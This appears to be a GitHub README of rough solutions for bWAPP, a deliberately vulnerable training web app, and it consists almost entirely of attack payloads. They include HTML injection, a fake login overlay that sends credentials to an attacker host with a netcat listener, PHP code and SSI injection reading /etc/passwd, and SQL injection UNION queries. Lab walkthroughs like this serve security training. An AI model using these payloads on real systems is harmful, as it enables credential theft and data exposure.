# solutions-bwapp
Rough solutions

### HTML Injection - Reflected (GET)
htmli_get.php

```
http://bepp:8088/bWAPP/htmli_get.php?firstname=%3Ch1%3EHello%3C%2Fh1%3E&lastname=%3Ch2%3EWorld%3C%2Fh2%3E&form=submit
```
 
### HTML Injection - Reflected (POST)

```
<h1>Hello</h1>
<h2>World</h2>
```

### HTML Injection - Reflected (URL)

XXX:  Todo, IE only?
```
http://bepp:8088/bWAPP/htmli_current_url.php
```

### HTML Injection - Stored (Blog)

Following solution taken from:
```
http://penthusiasts.blogspot.com/2013/12/bwapp-html-injection-all.html
```
```
<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="http://AttackerIP/login.htm"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
```

Attacker's machine:
```
nc -l 80
```

### PHP Code Injection

```
http://bepp:8088/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
```
### Server-Side Includes:

```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
```

### SQL Injection (GET/SEARCH)

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```

### SQL Injection (GET/SELECT)

```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_1.png)
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_2.png)
